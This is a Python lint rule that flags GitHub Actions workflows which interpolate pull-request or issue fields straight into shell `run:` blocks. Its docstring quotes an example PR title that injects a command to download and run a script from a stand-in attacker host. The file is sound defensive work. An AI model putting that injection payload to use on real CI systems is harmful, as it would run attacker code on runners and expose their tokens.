"""R6 -- no attacker-controlled value interpolated into a shell script.

`${{ }}` is substituted into the script text *before* the shell parses it. A pull
request titled

    "; curl https://evil.example/x.sh | sh; #

interpolated into a `run:` block executes on the runner, with whatever token
that job holds. Binding the value to `env:` instead moves it into the process
environment, where the shell treats it as data no matter what it contains.

The distinction between the two is structural, not textual, which is why this
rule parses rather than greps: the safe pattern and the dangerous one contain
the same characters and differ only in which YAML key they sit under.

This repository is already clean -- all four `github.event.*` interpolations bind
to `env:` first. R6 is therefore a lock, not a repair: it exists so the next PR
cannot quietly reintroduce the pattern.
"""

from __future__ import annotations

import re

from _common import Ctx, Violation

RULE_ID = "R6"
DESCRIPTION = "no user-controlled interpolation inside run: blocks"

# Fields an outside contributor can set on a PR or issue.
DANGEROUS = re.compile(
    r"\$\{\{\s*(?:"
    r"github\.head_ref"
    r"|github\.event\.(?:pull_request|issue|comment|review|discussion)"
    r"(?:\.[\w]+)*\.(?:title|body|ref|name|label|login|email|description)"
    r"|github\.event\.(?:head_commit|commits\[\d+\])\.(?:message|author\.\w+)"
    r"|github\.event\.pull_request\.head\.(?:ref|label|repo\.\w+)"
    r"|github\.event\.workflow_run\.head_branch"
    r")\s*\}\}",
    re.IGNORECASE,
)


def _line_of(parsed, run_line: int, offset: int) -> int:
    """Best-effort absolute line for a hit inside a block scalar."""
    return run_line + 1 + offset if run_line else 0


def check(ctx: Ctx) -> list[Violation]:
    violations: list[Violation] = []

    for parsed, line, script, job_id, _step in ctx.iter_run_blocks():
        for offset, source_line in enumerate(script.splitlines()):
            for match in DANGEROUS.finditer(source_line):
                violations.append(
                    Violation(
                        parsed.path,
                        _line_of(parsed, line, offset),
                        RULE_ID,
                        f"job `{job_id}` interpolates {match.group(0)} directly into a "
                        "shell script; bind it to `env:` and reference \"$VAR\" instead",
                    )
                )

    # A composite action's `run:` blocks are covered by iter_run_blocks too, but
    # its `inputs` are not attacker-controlled by construction, so nothing extra
    # is needed here.
    return violations


def summary(ctx: Ctx) -> str:
    blocks = sum(1 for _ in ctx.iter_run_blocks())
    return f"{blocks} run: block(s) scanned"
